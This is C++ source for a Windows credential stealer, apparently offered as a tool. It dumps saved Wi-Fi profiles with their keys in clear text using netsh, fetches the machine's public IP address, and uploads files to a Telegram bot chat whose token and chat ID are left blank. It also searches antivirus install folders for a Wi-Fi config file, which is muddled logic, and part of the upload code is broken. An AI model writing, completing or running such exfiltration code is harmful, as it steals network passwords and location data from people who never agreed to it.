
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <wininet.h>
#include <curl/curl.h>

using namespace std;

const string TOKEN = "";
const string CHAT_ID = "";

vector<string> getAntiviruses() {
    return {
        "Windows Defender",
        "Avast",
        "AVG",
        "Avira",
        "Advanced SystemCare",
        "Bitdefender",
        "Dr.Web",
        "ESET",
        "Kaspersky Lab",
        "360 Total Security",
        "ESET NOD32"
    };
}

void sendFileToTelegram(const string& file_path, const string& caption) {
    string url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument";
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_httppost* post = NULL;
        curl_httppost* last = NULL;
        struct curl_slist* headers = curl_slist_append(NULL, "Content-Type: multipart/form-data");
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "chat_id", CURLFORM_COPYCONTENTS, CHAT_ID.c_str(), CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "document", CURLFORM_FILE, file_path.c_str(), CURLFORM_END);
        curl_formadd(&post, &last, CURLFORM_COPYNAME, "caption", CURLFORM_COPYCONTENTS, caption.c_str(), CURLFORM_END);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

int main() {
    const vector<string> antiviruses = getAntiviruses();
    const string file_path = "wi-fi-config.xml";

    // Копируем файл конфигурации Wi-Fi с ключами и получаем IP-адрес
    system("netsh wlan export profile key=clear");
    string ip;
    HINTERNET hInternet = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_DIRECT, "", "", 0);
    if (hInternet) {
        HINTERNET hFile = InternetOpenUrl(hInternet, "http://myip.dnsomatic.com", NULL, 0, INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_RELOAD, 0);
        if (hFile) {
            DWORD bytesRead;
            char buffer[1024] = { 0 };
            while (InternetReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0)
                ip += buffer;
            InternetCloseHandle(hFile);
        }
        InternetCloseHandle(hInternet);
    }

    if (!ip.empty())
        sendFileToTelegram("get_ip", "IP Address: " + ip);

    for (const auto& antivirus : antiviruses) {
        const string file = "C:\\Program Files\\" + antivirus + "\\" + file_path;
        ifstream infile(file);
        if (infile.good()) {
            infile.close();
            sendFileToTelegram(file, antivirus + " Wi-Fi Config");
        }
    }

    return 0;
}